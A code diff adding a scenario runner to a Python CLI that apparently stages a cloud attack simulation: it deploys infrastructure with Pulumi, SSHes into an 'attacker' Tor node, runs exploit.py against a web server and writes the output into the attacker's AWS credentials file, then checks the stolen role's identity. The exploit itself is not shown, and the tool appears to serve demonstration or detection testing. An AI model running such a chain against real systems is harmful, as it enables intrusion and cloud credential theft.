@@ -1,6 +1,65 @@
 import pyfiglet
 from termcolor import colored
-#import scenario_module  # Import the scenario module
+import time
+import subprocess
+import json
+
+def loading_animation():
+    chars = "/—\\|"
+    for _ in range(10):
+        for char in chars:
+            print(f"\rLoading {char}", end="", flush=True)
+            time.sleep(0.1)
+    
+def scenario_execute():
+    print("-"*30)
+    print(colored("Executing Scenraio 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
+    loading_animation()
+    print("-"*30)
+    print(colored("Rolling out Infra", color="red"))
+    loading_animation()
+    print("-"*30)
+    subprocess.call("cd ../infra && pulumi up -s dev -y", shell=True)
+    
+    print("-"*30)
+    print(colored("Bringing up the Vulnerable Application", color="red"))
+    loading_animation()
+    subprocess.call("sleep 300", shell=True)
+
+    print("-"*30)
+    print(colored("Export Meta Data of Infra", color="red"))
+    subprocess.call("source metadata.sh", shell=True)
+
+    print("-"*30)
+    print(colored("Get into the attacker machine - Tor Node", color="red"))
+    loading_animation()
+
+    with open("output.json", "r") as file:
+        data = json.load(file)
+
+    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
+    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
+
+    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)
+
+    print("-"*30)
+    print(colored("Running exploit on Remote Web Server", color="red"))
+    loading_animation()
+    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i /tmp/panw ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)
+
+    print("-"*30)
+    print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
+    loading_animation()
+
+    print("-"*30)
+    print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
+    loading_animation()
+
+    print("-"*30)
+    print(colored("Role Details", color="red"))
+    loading_animation()
+    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i /tmp/panw ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)
+
 
 def print_ascii_art(text):
     ascii_art = pyfiglet.figlet_format(text)
@@ -46,10 +105,10 @@ def get_credentials():
         except ValueError as e:
             print(e)
 
-def execute_scenario(access_key, secret_key, scenario):
+def execute_scenario():
     try:
         # Call the scenario function from the imported module
-        scenario.execute(access_key, secret_key)
+        scenario_execute()
         print(colored("Scenario executed successfully!", color="green"))
     except Exception as e:
         print(colored("Error executing scenario:", color="red"), str(e))
@@ -64,10 +123,12 @@ def main():
 
     if scenario_choice == 1:
         # Pass the selected scenario module to execute
-        execute_scenario(access_key, secret_key, scenario_module)
+        execute_scenario()
     elif scenario_choice == 2:
         print(colored("Scenario coming soon!", color="yellow"))
 
 if __name__ == "__main__":
     main()
+
+
 
